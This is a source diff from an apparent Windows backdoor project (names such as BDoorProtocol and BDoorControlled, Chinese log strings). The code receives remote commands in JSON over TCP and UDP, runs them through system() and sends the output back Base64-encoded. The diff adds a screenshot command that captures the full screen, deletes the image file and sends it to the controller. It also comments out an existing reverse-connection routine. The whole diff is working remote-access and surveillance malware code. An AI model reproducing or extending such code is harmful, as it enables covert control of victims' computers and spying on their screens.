@@ -2,6 +2,7 @@
 #include <protocol/BDoorProtocol.h>
 #include <fstream>
 #include<vector>
+#include <fstream>
 #include <other\tools.h>
 #define CMD_RETURN_TXT_NAME "cmd_return.txt"
 #define CMDERROR "cmd命令执行失败"
@@ -26,7 +27,7 @@ int run_cmd_with_txt(string cmd_command, string& mess) {
 		DebugLog("文件打开失败");
 		return -1;
 	}
-	else {DebugLog("文件打开成功");}
+	else { DebugLog("文件打开成功"); }
 	fst.close();
 	cmd_command += string(" >> ") + CMD_RETURN_TXT_NAME;
 	if (system(cmd_command.data()) == -1) {
@@ -38,10 +39,10 @@ int run_cmd_with_txt(string cmd_command, string& mess) {
 	ifs.open(CMD_RETURN_TXT_NAME, ios::in);
 	string remess = "\n";
 	string buf;
-	while (getline(ifs, buf)) {remess += buf + string("\n");}
+	while (getline(ifs, buf)) { remess += buf + string("\n"); }
 	mess = remess;
 	ifs.close();
-	if (remove(string(CMD_RETURN_TXT_NAME).data()) == 0) {DebugLog("成功删除文件");}
+	if (remove(string(CMD_RETURN_TXT_NAME).data()) == 0) { DebugLog("成功删除文件"); }
 	else {
 		DebugLog("无法删除文件");
 		return -1;
@@ -85,12 +86,12 @@ private:
 		int Func(string command) override {
 			json command_json = json::parse(command);
 			if (command_json[COMMANDNAME] == name) {
-				cout << "cmd调用" << endl;
+				DebugLog("cmd调用");
 				string returnmess;
 				if(run_cmd_with_txt(command_json[CONTENT], returnmess) == -1){
 					returnmess = CMDERROR;
 				}
-				int Result = udp::SendtoBase64(udp_socket, udp_addr, FormatJson(name,EncodeStrInBase64(returnmess)).dump());
+				int Result = udp::SendtoBase64(udp_socket, udp_addr, FormatJson(name,EncodeBase64(returnmess,false)).dump());
 				if (Result == -1) { DebugLog(SENDERROR); }
 				else if (Result == 0) { DebugLog(DISCONNECT); }
 				DebugLog(returnmess);
@@ -145,7 +146,7 @@ private:
 				if (run_cmd_with_txt(command_json[CONTENT], returnmess) == -1) {
 					returnmess = CMDERROR;
 				}
-				int Result = tcp::SendBase64(connect_socket, FormatJson(name, EncodeStrInBase64(returnmess)).dump());
+				int Result = tcp::SendBase64(connect_socket, FormatJson(name, EncodeBase64(returnmess,false)).dump());
 				if (Result == -1) {
 					DebugLog(SENDERROR);
 					return -1;
@@ -161,10 +162,65 @@ private:
 		}
 		string GetName()override { return name; }
 	};
+	class ScreenShot :public RemoteCommand {
+	private:
+		const string name = "screenshot";
+		const string imagep = "image.";
+		SOCKET &connect_socket;
+		bool GetScreenShot(string format) {
+			HDC hdcSrc = GetDC(NULL);
+			int nBitPerPixel = GetDeviceCaps(hdcSrc, BITSPIXEL);
+			int nWidth = GetDeviceCaps(hdcSrc, HORZRES);
+			int nHeight = GetDeviceCaps(hdcSrc, VERTRES);
+			CImage image;
+			image.Create(nWidth, nHeight, nBitPerPixel);
+			BitBlt(image.GetDC(), 0, 0, nWidth, nHeight, hdcSrc, 0, 0, SRCCOPY);
+			ReleaseDC(NULL, hdcSrc);
+			image.ReleaseDC();
+			CString filepath(string(imagep + format).c_str());
+			int format_pos = VectorFind(image_format, format);
+			image.Save((LPCTSTR)filepath, GUID_vec[format_pos]);
+			return true;
+		}
+	public:
+		ScreenShot(SOCKET &connect_socket_a):connect_socket(connect_socket_a){}
+		int Func(string command)override {
+			json com_json = json::parse(command);
+			if (com_json[COMMANDNAME] == name) {
+				GetScreenShot(com_json[CONTENT][IMAGEFORMAT]);
+				string file_name = imagep + string(com_json[CONTENT][IMAGEFORMAT]);
+				ifstream ifs;
+				ifs.open(file_name, ios::in|ios::binary);
+				vector<char> data(istreambuf_iterator<char>(ifs), {});
+				ifs.close();
+				if (remove(file_name.data()) == 0) {
+					DebugLog("成功删除图片");
+				}
+				else {
+					DebugLog("无法删除图片");
+				}
+				string img_data;
+				for (int i = 0; i < data.size(); i++) { img_data += data[i]; }
+				DebugLog("img_data size："+ to_string(img_data.size()));
+				int Result = tcp::SendBase64(connect_socket, img_data);
+				if (Result == -1) {
+					DebugLog(SENDERROR);
+					return -1;
+				}
+				else if(Result == 0){
+					DebugLog(DISCONNECT);
+				}
+				return 1;
+			}
+			return 0;
+		}
+		string GetName()override {return name;}
+	};
 	const string name = "tcp";
 	SOCKET connect_socket;
 	Cmd cmd = Cmd(connect_socket);
-	vector<RemoteCommand*> remote_command_list = { &cmd };
+	ScreenShot screenshot = ScreenShot(connect_socket);
+	vector<RemoteCommand*> remote_command_list = { &cmd,&screenshot};
 public:
 	int Func() override{
 		DebugLog("TCP线程启动");
@@ -174,9 +230,9 @@ public:
 		listen_addr.sin_port = htons(TCP_PORT);
 		listen_addr.sin_addr.s_addr = htonl(INADDR_ANY);
 		bindport(listen_socket, (const sockaddr*)&listen_addr, sizeof(listen_addr));
-		thread(&TCP::ReverseConnect,this).detach();
+		//thread(&TCP::ReverseConnect,this).detach();
+		listen(listen_socket,5);
 		while (true) {
-			listen(listen_socket,5);
 			sockaddr_in connect_addr;
 			int connect_addr_len = sizeof(connect_addr);
 			connect_socket = accept(listen_socket, (sockaddr*)&connect_addr, &connect_addr_len);
@@ -197,7 +253,7 @@ public:
 			}
 		}
 	}
-	int ReverseConnect() {
+	/*int ReverseConnect() {
 		int Result;
 		DebugLog("反向TCP线程启动");
 		SOCKET reverse_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
@@ -210,22 +266,34 @@ public:
 			string recvmess;
 			sockaddr_in sender_addr;
 			Result = udp::RecvfromBase64(reverse_socket, sender_addr, recvmess);
-			if (Result == -1) { DebugLog(RECVERROR); }
-			else if (Result == 0) { DebugLog(DISCONNECT); }
-			DebugLog(string(inet_ntoa(sender_addr.sin_addr)) + ": 反向连接请求");
+			if (Result == -1) {
+				DebugLog(RECVERROR);
+				continue;
+			}
+			else if (Result == 0) {
+				DebugLog(DISCONNECT); 
+				continue;
+			}
 			json requestmess;
 			requestmess.parse(recvmess);
 			if (requestmess[COMMANDNAME] == name) {
 				if (requestmess[CONTENT] == REVERSECONNECT) {
+					DebugLog(string(inet_ntoa(sender_addr.sin_addr)) + ": 反向连接请求");
 					connect_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 					sockaddr_in addr;
 					addr.sin_family = AF_INET;
 					addr.sin_port = htons(TCP_PORT);
 					addr.sin_addr.s_addr = inet_addr(inet_ntoa(sender_addr.sin_addr));
 					connect(connect_socket, (const sockaddr*)&addr, sizeof(addr));
-					Result = tcp::RecvBase64(connect_socket, recvmess);
-					if (Result == -1) { DebugLog(RECVERROR); }
-					else if (Result == 0) { DebugLog(DISCONNECT); }
+					int Result = tcp::RecvBase64(connect_socket, recvmess);
+					if (Result == -1) {
+						DebugLog(RECVERROR);
+						return ERROR;
+					}
+					else if (Result == 0) {
+						DebugLog(DISCONNECT);
+						return ERROR;
+					}
 					DebugLog(string(inet_ntoa(addr.sin_addr)) + "/TCP>" + recvmess);
 					for (int i = 0; i < remote_command_list.size(); i++) {
 						remote_command_list[i]->Func(recvmess);
@@ -233,7 +301,7 @@ public:
 				}
 			}
 		}	
-	}
+	}*/
 	string GetName()override { return name; }
 };
 class BDoorControlled {
